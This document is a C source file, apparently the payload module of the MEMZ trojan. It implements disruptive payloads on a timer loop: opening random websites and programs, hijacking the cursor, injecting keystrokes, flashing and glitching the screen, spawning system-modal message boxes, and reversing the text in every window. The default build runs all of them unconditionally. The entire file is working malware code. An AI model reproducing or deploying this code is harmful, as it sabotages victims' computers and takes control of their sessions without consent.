#include "memz.h"

PAYLOAD payloads[] = {
#ifdef CLEAN
	{ payloadExecute, L"Open random websites/programs", NULL, 0, 0, 0, 0, FALSE },
	{ payloadCursor, L"Random cursor movement", NULL, 0, 0, 0, 0, TRUE },
	{ payloadKeyboard, L"Random keyboard input", NULL, 0, 0, 0, 0, FALSE },
	{ payloadSound, L"Random error sounds", NULL, 0, 0, 0, 0, TRUE },
	{ payloadBlink, L"Flashing screen", NULL, 0, 0, 0, 0, TRUE },
	{ payloadMessageBox, L"Message boxes", NULL, 0, 0, 0, 0, TRUE },
	{ payloadDrawErrors, L"Draw error icons", NULL, 0, 0, 0, 0, TRUE },
	{ payloadChangeText, L"Reverse text on screen", NULL, 0, 0, 0, 0, FALSE },
	{ payloadPIP, L"Render screen into screen", NULL, 0, 0, 0, 0, TRUE },
	{ payloadPuzzle, L"Screen glitches", NULL, 0, 0, 0, 0, TRUE }
#else
	{ payloadExecute, 30000 },
	{ payloadCursor, 30000 },
	{ payloadKeyboard, 20000 },
	{ payloadSound, 50000 },
	{ payloadBlink, 30000 },
	{ payloadMessageBox, 20000 },
	{ payloadDrawErrors, 10000 },
	{ payloadChangeText, 40000 },
	{ payloadPIP, 60000 },
	{ payloadPuzzle, 15000 }
#endif
};

const size_t nPayloads = sizeof(payloads) / sizeof(PAYLOAD);
BOOLEAN enablePayloads = TRUE;

DWORD WINAPI payloadThread(LPVOID parameter) {
#ifndef CLEAN
	int delay = 0;
	int times = 0;
	int runtime = 0;
#endif

	PAYLOAD *payload = (PAYLOAD*)parameter;

	for (;;) {
#ifdef CLEAN
		if (enablePayloads && SendMessage(payload->btn, BM_GETCHECK, 0, NULL) == BST_CHECKED) {
			if (payload->delaytime++ >= payload->delay) {
				payload->delay = (payload->payloadFunction)(payload->times++, payload->runtime, FALSE);
				payload->delaytime = 0;
			}

			payload->runtime++;
		} else {
			 payload->runtime = 0;
			 payload->times = 0;
			 payload->delay = 0;
		}
#else
		if (delay-- == 0) {
			delay = (payload->payloadFunction)(times++, runtime);
		}

		runtime++;
#endif
		Sleep(10);
	}
}

int payloadExecute(PAYLOADFUNC) {
	PAYLOADHEAD

	ShellExecuteA(NULL, "open", (LPCSTR)sites[random() % nSites], NULL, NULL, SW_SHOWDEFAULT);

	out: return 1500.0 / (times / 15.0 + 1) + 100 + (random() % 200);
}

int payloadBlink(PAYLOADFUNC) {
	PAYLOADHEAD

	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	RECT rekt;
	GetWindowRect(hwnd, &rekt);
	BitBlt(hdc, 0, 0, rekt.right - rekt.left, rekt.bottom - rekt.top, hdc, 0, 0, NOTSRCCOPY);
	ReleaseDC(hwnd, hdc);

	out: return 100;
}

int payloadCursor(PAYLOADFUNC) {
	PAYLOADHEAD

	POINT cursor;
	GetCursorPos(&cursor);

	SetCursorPos(cursor.x + (random() % 3 - 1) * (random() % (runtime / 2200 + 2)), cursor.y + (random() % 3 - 1) * (random() % (runtime / 2200 + 2)));

	out: return 2;
}

int payloadMessageBox(PAYLOADFUNC) {
	PAYLOADHEAD

	CreateThread(NULL, 4096, &messageBoxThread, NULL, NULL, NULL);

	out: return 2000.0 / (times / 8.0 + 1) + 20 + (random() % 30);
}

DWORD WINAPI messageBoxThread(LPVOID parameter) {
	HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
	MessageBoxW(NULL, L"Still using this computer?", L"lol", MB_SYSTEMMODAL | MB_OK | MB_ICONWARNING);
	UnhookWindowsHookEx(hook);

	return 0;
}

LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HCBT_CREATEWND) {
		CREATESTRUCT *pcs = ((CBT_CREATEWND *)lParam)->lpcs;

		if ((pcs->style & WS_DLGFRAME) || (pcs->style & WS_POPUP)) {
			HWND hwnd = (HWND)wParam;

			int x = random() % (scrw - pcs->cx);
			int y = random() % (scrh - pcs->cy);

			pcs->x = x;
			pcs->y = y;
		}
	}

	return CallNextHookEx(0, nCode, wParam, lParam);
}

int payloadChangeText(PAYLOADFUNC) {
	PAYLOADHEAD
	EnumChildWindows(GetDesktopWindow(), &EnumChildProc, NULL);

	out: return 50;
}

BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
	LPWSTR str = (LPWSTR)GlobalAlloc(GMEM_ZEROINIT, sizeof(WCHAR) * 8192);

	if (SendMessageTimeoutW(hwnd, WM_GETTEXT, 8192, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL)) {
		strReverseW(str);
		SendMessageTimeoutW(hwnd, WM_SETTEXT, NULL, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL);
	}
	
	GlobalFree(str);

	return TRUE;
}

int payloadSound(PAYLOADFUNC) {
	PAYLOADHEAD

	PlaySoundA(sounds[random() % nSounds], NULL, SND_ASYNC);
	out: return 20 + (random() % 20);
}

int payloadPuzzle(PAYLOADFUNC) {
	PAYLOADHEAD
	
	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	RECT rekt;
	GetWindowRect(hwnd, &rekt);

	int x1 = random() % (rekt.right - 100);
	int y1 = random() % (rekt.bottom - 100);
	int x2 = random() % (rekt.right - 100);
	int y2 = random() % (rekt.bottom - 100);
	int width = random() % 600;
	int height = random() % 600;

	BitBlt(hdc, x1, y1, width, height, hdc, x2, y2, SRCCOPY);
	ReleaseDC(hwnd, hdc);

	out: return 200.0 / (times / 5.0 + 1) + 3;
}

int payloadKeyboard(PAYLOADFUNC) {
	PAYLOADHEAD

	INPUT input;

	input.type = INPUT_KEYBOARD;
	input.ki.wVk = (random() % (0x5a - 0x30)) + 0x30;
	SendInput(1, &input, sizeof(INPUT));

	out: return 300 + (random() % 400);
}

int payloadPIP(PAYLOADFUNC) {
	PAYLOADHEAD

	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	RECT rekt;
	GetWindowRect(hwnd, &rekt);
	StretchBlt(hdc, 50, 50, rekt.right - 100, rekt.bottom - 100, hdc, 0, 0, rekt.right, rekt.bottom, SRCCOPY);
	ReleaseDC(hwnd, hdc);

	out: return 200.0 / (times / 5.0 + 1) + 4;
}

int payloadDrawErrors(PAYLOADFUNC) {
	PAYLOADHEAD

	int ix = GetSystemMetrics(SM_CXICON) / 2;
	int iy = GetSystemMetrics(SM_CYICON) / 2;
	
	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);

	POINT cursor;
	GetCursorPos(&cursor);

	DrawIcon(hdc, cursor.x - ix, cursor.y - iy, LoadIcon(NULL, IDI_ERROR));

	if (random() % (int)(10/(times/500.0+1)+1) == 0) {
		DrawIcon(hdc, random()%scrw, random()%scrh, LoadIcon(NULL, IDI_WARNING));
	}
	
	ReleaseDC(hwnd, hdc);

	out: return 2;
}
